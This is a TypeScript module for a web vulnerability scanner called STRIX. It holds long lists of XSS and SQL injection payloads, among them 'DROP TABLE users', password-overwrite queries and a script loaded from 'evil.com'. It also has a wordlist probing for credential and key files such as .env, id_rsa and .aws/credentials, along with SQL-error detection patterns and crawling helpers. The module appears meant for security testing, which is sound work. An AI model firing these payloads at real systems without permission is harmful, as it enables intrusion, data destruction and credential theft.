// STRIX Deep Scanner Module
// Comprehensive security scanning with extensive payloads and thorough testing

// ============================================================================
// EXTENSIVE PAYLOAD LISTS
// ============================================================================

// XSS Payloads - 60+ variations
export const XSS_PAYLOADS_EXTENDED = [
    // Basic script injection
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script src="https://evil.com/xss.js"></script>',

    // Event handlers
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<img/src=x onerror=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert(1)>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror=alert("XSS")>',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<object data="javascript:alert(\'XSS\')">',
    '<embed src="javascript:alert(\'XSS\')">',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(\'XSS\')">',

    // Attribute breakout
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '"><img src=x onerror=alert("XSS")>',
    "' onclick=alert('XSS')//",
    '" onclick=alert("XSS")//',
    "' onmouseover=alert('XSS')//",
    '" onfocus=alert("XSS") autofocus="',

    // JavaScript context
    "';alert('XSS');//",
    '";alert("XSS");//',
    "'-alert('XSS')-'",
    '"-alert("XSS")-"',
    "\\';alert(\\'XSS\\');//",
    '</script><script>alert("XSS")</script>',

    // URL/protocol handlers
    'javascript:alert("XSS")',
    'javascript:alert(1)',
    'data:text/html,<script>alert("XSS")</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'vbscript:msgbox("XSS")',

    // Encoded payloads
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '%3Cimg%20src=x%20onerror=alert(1)%3E',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',

    // Double encoding
    '%253Cscript%253Ealert(1)%253C/script%253E',

    // Null byte injection
    '<scr%00ipt>alert(1)</script>',
    '<img src=x onerror%00=alert(1)>',

    // Case variations
    '<ScRiPt>alert(1)</ScRiPt>',
    '<IMG SRC=x ONERROR=alert(1)>',

    // HTML5 specific
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributename=x>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<form><button formaction=javascript:alert(1)>X</button>',
    '<math><a xlink:href="javascript:alert(1)">click',

    // Template injection
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '#{alert(1)}',

    // Polyglots
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
];

// SQL Injection Payloads - 60+ variations
export const SQLI_PAYLOADS_EXTENDED = [
    // Basic authentication bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "admin'/*",
    "') OR ('1'='1",
    "') OR ('1'='1'--",

    // Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION ALL SELECT NULL--",
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL--",

    // Error-based (MySQL)
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",

    // Error-based (MSSQL)
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=(SELECT TOP 1 CAST(name AS varchar(4000)) FROM sysobjects WHERE xtype='U')--",

    // Error-based (PostgreSQL)
    "' AND 1=CAST((SELECT version()) AS int)--",

    // Error-based (Oracle)
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",

    // Time-based blind
    "' AND SLEEP(5)--",
    "' AND SLEEP(5)#",
    "1' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "' || pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",

    // Boolean-based blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",

    // Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','hacker')--",
    "'; UPDATE users SET password='hacked'--",

    // NoSQL injection (MongoDB)
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    "' || '1'=='1",
    '[$ne]=1',
    '[$gt]=',
    '[$regex]=.*',

    // Order by
    "' ORDER BY 1--",
    "' ORDER BY 10--",
    "' ORDER BY 100--",
    "1 ORDER BY 1",
    "1 ORDER BY 10",

    // Comment variations
    "' OR 1=1;--",
    "' OR 1=1;#",
    "' OR 1=1;/*",

    // Whitespace bypass
    "'/**/OR/**/1=1--",
    "'%09OR%091=1--",
    "'%0AOR%0A1=1--",
];

// Directory/Path enumeration list - 500+ common paths
export const DIRECTORY_WORDLIST = [
    // Configuration files
    '.env', '.env.local', '.env.production', '.env.development', '.env.backup',
    'config.php', 'config.js', 'config.json', 'config.yml', 'config.yaml', 'config.xml',
    'settings.php', 'settings.py', 'settings.json',
    'database.yml', 'database.php', 'db.php', 'db_config.php',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php.old',
    'application.properties', 'application.yml',

    // Backup files
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.tar', 'backup.rar',
    'www.zip', 'site.zip', 'web.zip', 'html.zip', 'public.zip',
    'db.sql', 'database.sql', 'dump.sql', 'mysql.sql', 'backup.sql.gz',
    'index.php.bak', 'index.php.old', 'index.php~', 'index.html.bak',

    // Admin panels
    'admin', 'admin/', 'administrator', 'administrator/',
    'admin.php', 'admin.html', 'admin/login', 'admin/index.php',
    'adminpanel', 'admin-panel', 'admin_panel',
    'cpanel', 'controlpanel', 'control-panel',
    'dashboard', 'dashboard/', 'panel', 'panel/',
    'manage', 'management', 'manager',
    'webadmin', 'siteadmin', 'adminarea', 'bb-admin',
    'wp-admin', 'wp-admin/', 'wp-login.php',
    'phpmyadmin', 'phpmyadmin/', 'pma', 'myadmin', 'mysql',

    // API endpoints
    'api', 'api/', 'api/v1', 'api/v2', 'api/v3',
    'rest', 'rest/', 'restapi',
    'graphql', 'graphql/', '_graphql',
    'swagger', 'swagger/', 'swagger.json', 'swagger.yaml',
    'api-docs', 'api/docs', 'docs/api',
    'openapi', 'openapi.json', 'openapi.yaml',

    // Authentication
    'login', 'login/', 'login.php', 'login.html', 'login.aspx',
    'signin', 'sign-in', 'sign_in',
    'logout', 'signout', 'sign-out',
    'register', 'signup', 'sign-up', 'registration',
    'forgot-password', 'forgot_password', 'reset-password', 'reset_password',
    'auth', 'authenticate', 'oauth', 'oauth2',

    // User management
    'user', 'users', 'user/', 'users/',
    'profile', 'profiles', 'account', 'accounts',
    'member', 'members', 'customer', 'customers',

    // Common directories
    'images', 'img', 'image', 'assets', 'static',
    'css', 'js', 'javascript', 'scripts', 'script',
    'upload', 'uploads', 'files', 'documents', 'docs',
    'media', 'content', 'data', 'resources',
    'includes', 'include', 'inc', 'lib', 'libs', 'library',
    'modules', 'plugins', 'extensions', 'addons',
    'themes', 'templates', 'views', 'layouts',
    'cache', 'cached', 'tmp', 'temp', 'temporary',
    'logs', 'log', 'debug', 'error', 'errors',
    'private', 'secure', 'protected', 'restricted',
    'public', 'pub', 'www', 'html', 'htdocs', 'webroot',

    // Version control
    '.git', '.git/', '.git/config', '.git/HEAD', '.gitignore',
    '.svn', '.svn/', '.svn/entries',
    '.hg', '.hg/', '.hgignore',
    '.bzr', '.bzr/',

    // Server configuration
    '.htaccess', '.htpasswd', 'web.config',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml',
    'favicon.ico', 'manifest.json', 'browserconfig.xml',
    'security.txt', '.well-known/security.txt',

    // Development
    'test', 'tests', 'testing', 'dev', 'development',
    'staging', 'stage', 'demo', 'sandbox',
    'beta', 'alpha', 'preview', 'debug',

    // Common CMS paths
    'wordpress', 'wp-content', 'wp-includes', 'wp-json',
    'drupal', 'sites/default', 'sites/all',
    'joomla', 'administrator', 'components', 'modules',
    'magento', 'downloader', 'var/log',

    // Framework paths
    'vendor', 'node_modules', 'bower_components',
    'composer.json', 'composer.lock', 'package.json', 'package-lock.json',
    'Gemfile', 'Gemfile.lock', 'requirements.txt', 'Pipfile',
    'artisan', 'craft', 'console',

    // Sensitive files
    'id_rsa', 'id_rsa.pub', 'id_dsa', 'id_dsa.pub',
    '.ssh/id_rsa', '.ssh/authorized_keys',
    'server.key', 'server.crt', 'certificate.crt', 'private.key',
    '.bash_history', '.mysql_history', '.psql_history',
    '.DS_Store', 'Thumbs.db', 'desktop.ini',

    // Database
    'phpinfo.php', 'info.php', 'test.php',
    'adminer.php', 'adminer', 'dbadmin',
    'sql', 'mysql', 'postgresql', 'mongodb', 'redis',

    // Monitoring
    'status', 'health', 'healthcheck', 'health-check',
    'server-status', 'server-info',
    'metrics', 'prometheus', 'grafana',
    'kibana', 'elasticsearch',

    // Cloud/DevOps
    '.aws/credentials', '.aws/config',
    '.docker', 'docker-compose.yml', 'Dockerfile',
    '.kubernetes', 'k8s', 'kubernetes',
    'terraform.tfstate', '.terraform',
    'ansible.cfg', 'playbook.yml',
    'jenkins', 'gitlab-ci.yml', '.github/workflows',

    // More paths...
    'cgi-bin', 'cgi', 'fcgi-bin',
    'servlet', 'servlets', 'axis', 'axis2',
    'webservice', 'webservices', 'service', 'services',
    'soap', 'wsdl',
    'xmlrpc', 'xmlrpc.php',
    'feed', 'feeds', 'rss', 'atom',
    'search', 'find', 'query',
    'shop', 'store', 'cart', 'checkout', 'order', 'orders',
    'payment', 'pay', 'billing', 'invoice', 'invoices',
    'download', 'downloads', 'export', 'import',
    'report', 'reports', 'statistics', 'stats', 'analytics',
    'forum', 'forums', 'board', 'boards', 'community',
    'blog', 'blogs', 'news', 'article', 'articles', 'post', 'posts',
    'page', 'pages', 'category', 'categories', 'tag', 'tags',
    'archive', 'archives', 'old', 'legacy', 'deprecated',
    'internal', 'intranet', 'extranet', 'portal',
    'mail', 'email', 'webmail', 'smtp', 'imap', 'pop3',
    'ftp', 'sftp', 'ssh',
    'cdn', 'static', 'assets',
    'proxy', 'gateway', 'loadbalancer', 'lb',
    'socket', 'websocket', 'ws', 'wss',
];

// Common parameter names to test
export const COMMON_PARAMETERS = [
    // General
    'id', 'ID', 'Id',
    'page', 'p', 'pg',
    'q', 'query', 'search', 's', 'keyword', 'term',
    'name', 'username', 'user', 'u', 'usr',
    'email', 'mail', 'e',
    'password', 'pass', 'pwd', 'passwd',
    'file', 'filename', 'path', 'filepath', 'document',
    'url', 'link', 'href', 'src', 'source', 'dest', 'destination', 'uri', 'redirect', 'return', 'returnUrl', 'return_url', 'next', 'goto', 'target',
    'cat', 'category', 'categoryid', 'category_id',
    'item', 'itemid', 'item_id', 'product', 'productid', 'product_id',
    'action', 'act', 'do', 'cmd', 'command', 'func', 'function',
    'type', 't', 'format', 'fmt',
    'lang', 'language', 'locale', 'l',
    'sort', 'order', 'orderby', 'order_by', 'sortby', 'sort_by', 'dir', 'direction',
    'limit', 'count', 'num', 'max', 'offset', 'start', 'from', 'to',
    'date', 'day', 'month', 'year', 'time', 'timestamp',
    'token', 'key', 'apikey', 'api_key', 'auth', 'session', 'sid', 'sessionid',
    'callback', 'cb', 'jsonp',
    'debug', 'test', 'dev', 'mode',
    'version', 'v', 'ver',
    'data', 'json', 'xml', 'content', 'body', 'text', 'message', 'msg',
    'comment', 'description', 'title', 'subject', 'note',
    'ref', 'reference', 'referer', 'referrer',
    'template', 'tpl', 'view', 'layout', 'theme', 'skin',
    'module', 'mod', 'plugin', 'extension', 'addon', 'component',
    'include', 'require', 'load', 'import',
    'filter', 'where', 'condition',
];

// Error patterns indicating vulnerabilities
export const SQL_ERROR_PATTERNS = [
    // MySQL
    /SQL syntax.*MySQL/i,
    /Warning.*mysql_/i,
    /MySQLSyntaxErrorException/i,
    /valid MySQL result/i,
    /check the manual that corresponds to your MySQL server version/i,
    /MySqlClient\./i,
    /com\.mysql\.jdbc/i,

    // PostgreSQL
    /PostgreSQL.*ERROR/i,
    /Warning.*\Wpg_/i,
    /valid PostgreSQL result/i,
    /Npgsql\./i,
    /PG::SyntaxError/i,
    /org\.postgresql\.util\.PSQLException/i,

    // Microsoft SQL Server
    /Driver.* SQL[\-\_\ ]*Server/i,
    /OLE DB.* SQL Server/i,
    /\bSQL Server[^&lt;&quot;]+Driver/i,
    /Warning.*mssql_/i,
    /\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,
    /System\.Data\.SqlClient\./i,
    /Exception.*\WSystem\.Data\.SqlClient\./i,
    /Microsoft SQL Native Client/i,

    // Oracle
    /\bORA-[0-9][0-9][0-9][0-9]/i,
    /Oracle error/i,
    /Oracle.*Driver/i,
    /Warning.*\Woci_/i,
    /Warning.*\Wora_/i,
    /oracle\.jdbc/i,
    /PLS-[0-9][0-9][0-9][0-9]/i,

    // SQLite
    /SQLite\/JDBCDriver/i,
    /SQLite\.Exception/i,
    /System\.Data\.SQLite\.SQLiteException/i,
    /Warning.*sqlite_/i,
    /Warning.*SQLite3::/i,
    /SQLITE_ERROR/i,
    /sqlite3\.OperationalError/i,

    // General
    /SQL syntax/i,
    /syntax error/i,
    /unclosed quotation mark/i,
    /quoted string not properly terminated/i,
    /unterminated string/i,
    /unexpected end of SQL/i,
    /ODBCException/i,
    /JDBC/i,
    /hibernate/i,
];

// ============================================================================
// DEEP SCANNING FUNCTIONS
// ============================================================================

export interface DeepScanOptions {
    maxPages?: number;           // Maximum pages to crawl (default: 50)
    maxDepth?: number;           // Maximum crawl depth (default: 3)
    testAllParams?: boolean;     // Test all discovered parameters
    directoryEnum?: boolean;     // Run directory enumeration
    timeBasedTests?: boolean;    // Run time-based blind tests
    maxPayloads?: number;        // Max payloads per parameter (default: 10)
    timeout?: number;            // Request timeout in ms
    delay?: number;              // Delay between requests in ms
    onProgress?: (status: DeepScanProgress) => void;
}

export interface DeepScanProgress {
    phase: string;
    current: number;
    total: number;
    message: string;
    pagesScanned: number;
    vulnerabilities: number;
    currentUrl?: string;
}

export interface DiscoveredPage {
    url: string;
    depth: number;
    params: string[];
    forms: FormInfo[];
    status: number;
}

export interface FormInfo {
    action: string;
    method: string;
    inputs: Array<{ name: string; type: string; value?: string }>;
}

export interface DeepScanResult {
    pagesDiscovered: number;
    pagesScanned: number;
    parametersFound: number;
    parametersTested: number;
    directoriesChecked: number;
    directoriesFound: string[];
    vulnerabilities: DeepVulnerability[];
    scanDuration: number;
}

export interface DeepVulnerability {
    id: string;
    type: 'xss' | 'sqli' | 'lfi' | 'rfi' | 'ssrf' | 'directory' | 'sensitive-file' | 'open-redirect' | 'info-disclosure';
    severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
    title: string;
    url: string;
    parameter?: string;
    payload?: string;
    evidence: string;
    request?: string;
    response?: string;
    confidence: 'confirmed' | 'likely' | 'possible';
}

/**
 * Extract all links from HTML
 */
export function extractLinks(html: string, baseUrl: string): string[] {
    const links: string[] = [];
    const seen = new Set<string>();

    // Extract href links - simplified universal regex
    const hrefRegex = /href=["']?([^"'\s>]+)["']?/gi;
    let match;
    while ((match = hrefRegex.exec(html)) !== null) {
        try {
            const val = match[1];
            if (!val || val.startsWith('javascript:') || val.startsWith('mailto:') || val.startsWith('#')) continue;

            const url = new URL(val, baseUrl);
            // Only same-origin links
            if (url.origin === new URL(baseUrl).origin && !seen.has(url.href)) {
                seen.add(url.href);
                links.push(url.href);
            }
        } catch { }
    }

    // Extract form actions
    const actionRegex = /action=["']([^"']+)["']/gi;
    while ((match = actionRegex.exec(html)) !== null) {
        try {
            const url = new URL(match[1], baseUrl);
            if (url.origin === new URL(baseUrl).origin && !seen.has(url.href)) {
                seen.add(url.href);
                links.push(url.href);
            }
        } catch { }
    }

    // Extract JavaScript URLs
    const jsUrlRegex = /['"]([\/][^'"]*\.(?:php|asp|aspx|jsp|html|htm)[^'"]*)['"]/gi;
    while ((match = jsUrlRegex.exec(html)) !== null) {
        try {
            const url = new URL(match[1], baseUrl);
            if (url.origin === new URL(baseUrl).origin && !seen.has(url.href)) {
                seen.add(url.href);
                links.push(url.href);
            }
        } catch { }
    }

    return links;
}

/**
 * Extract parameters from URL and forms
 */
export function extractParameters(url: string, html: string): string[] {
    const params = new Set<string>();

    // URL parameters
    try {
        const urlObj = new URL(url);
        for (const key of urlObj.searchParams.keys()) {
            params.add(key);
        }
    } catch { }

    // Form inputs
    const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
    let match;
    while ((match = inputRegex.exec(html)) !== null) {
        params.add(match[1]);
    }

    // Textarea
    const textareaRegex = /<textarea[^>]*name=["']([^"']+)["'][^>]*>/gi;
    while ((match = textareaRegex.exec(html)) !== null) {
        params.add(match[1]);
    }

    // Select
    const selectRegex = /<select[^>]*name=["']([^"']+)["'][^>]*>/gi;
    while ((match = selectRegex.exec(html)) !== null) {
        params.add(match[1]);
    }

    return Array.from(params);
}

/**
 * Extract forms from HTML
 */
export function extractForms(html: string, baseUrl: string): FormInfo[] {
    const forms: FormInfo[] = [];
    const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/gi;

    let match;
    while ((match = formRegex.exec(html)) !== null) {
        const formHtml = match[0];
        const formContent = match[1];

        const actionMatch = formHtml.match(/action=["']([^"']+)["']/i);
        let action = actionMatch?.[1] || '';
        try {
            action = action ? new URL(action, baseUrl).href : baseUrl;
        } catch {
            action = baseUrl;
        }

        const methodMatch = formHtml.match(/method=["']([^"']+)["']/i);
        const method = (methodMatch?.[1] || 'GET').toUpperCase();

        const inputs: FormInfo['inputs'] = [];
        const inputRegex = /<input[^>]*>/gi;
        let inputMatch;
        while ((inputMatch = inputRegex.exec(formContent)) !== null) {
            const inputHtml = inputMatch[0];
            const nameMatch = inputHtml.match(/name=["']([^"']+)["']/i);
            const typeMatch = inputHtml.match(/type=["']([^"']+)["']/i);
            const valueMatch = inputHtml.match(/value=["']([^"']+)["']/i);

            if (nameMatch) {
                inputs.push({
                    name: nameMatch[1],
                    type: typeMatch?.[1] || 'text',
                    value: valueMatch?.[1]
                });
            }
        }

        forms.push({ action, method, inputs });
    }

    return forms;
}

/**
 * Check if response indicates SQL error
 */
export function detectSqlError(response: string): { detected: boolean; pattern?: string; snippet?: string } {
    for (const pattern of SQL_ERROR_PATTERNS) {
        const match = response.match(pattern);
        if (match) {
            return {
                detected: true,
                pattern: pattern.source,
                snippet: match[0]
            };
        }
    }
    return { detected: false };
}

/**
 * Check if XSS payload is reflected
 */
export function detectXssReflection(response: string, payload: string): boolean {
    // Direct reflection
    if (response.includes(payload)) return true;

    // Partial reflection (event handlers, scripts)
    const eventHandlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus'];
    for (const handler of eventHandlers) {
        if (payload.includes(handler) && response.includes(handler)) {
            return true;
        }
    }

    // Script tag reflection
    if (payload.includes('<script') && response.includes('<script')) {
        const scriptContent = payload.match(/<script[^>]*>(.*?)<\/script>/i)?.[1];
        if (scriptContent && response.includes(scriptContent)) {
            return true;
        }
    }

    return false;
}

/**
 * Generate unique ID
 */
export function generateId(): string {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

export default {
    XSS_PAYLOADS_EXTENDED,
    SQLI_PAYLOADS_EXTENDED,
    DIRECTORY_WORDLIST,
    COMMON_PARAMETERS,
    SQL_ERROR_PATTERNS,
    extractLinks,
    extractParameters,
    extractForms,
    detectSqlError,
    detectXssReflection,
    generateId
};
